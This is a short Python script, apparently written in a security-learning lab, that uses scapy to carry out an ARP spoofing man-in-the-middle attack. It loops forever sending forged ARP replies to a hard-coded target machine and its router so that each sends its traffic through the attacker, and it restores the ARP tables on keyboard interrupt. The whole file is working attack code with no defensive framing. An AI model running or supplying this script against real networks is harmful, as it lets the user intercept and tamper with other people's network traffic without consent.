#!/usr/bin/env python
import scapy.all as scapy
import time

def get_mac(ip):
    # ARP instance for creating an ARP packet
    arp_request = scapy.ARP(pdst=ip)

    # Creating an ethernet packet with broadcast MAC address
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

    # Create a combined packet with ARP and ethernet request
    arp_broadcast_packet = broadcast/arp_request

    # Send the newly created custom packet on the network and capture the response
    (answered_lists, unanswered_lists) = scapy.srp(arp_broadcast_packet, timeout=1, verbose=False)

    return answered_lists[0][1].hwsrc


def spoof(target_ip, spoofed_ip):
    # Set the packet as response packet by changing op=2, pdst=TARGET Machine and psrc=IPofGateway
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoofed_ip)

    scapy.send(packet, verbose=False)

def restore(dest_ip, src_ip):
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=get_mac(dest_ip), psrc=src_ip, hwsrc=get_mac(src_ip))
    scapy.send(packet, verbose=False)

target_ip = "192.168.37.132"
router_ip = "192.168.37.2"
try:
    send_packet_count = 0
    while True:
        # Spoof the packets continuously till we stop the attack
        spoof(target_ip, router_ip)
        spoof(router_ip, target_ip)
        send_packet_count += 1
        print("\r[+] Packets sent " + str(send_packet_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\nDetected Program Quit")
    restore(target_ip, router_ip)
    restore(router_ip, target_ip)
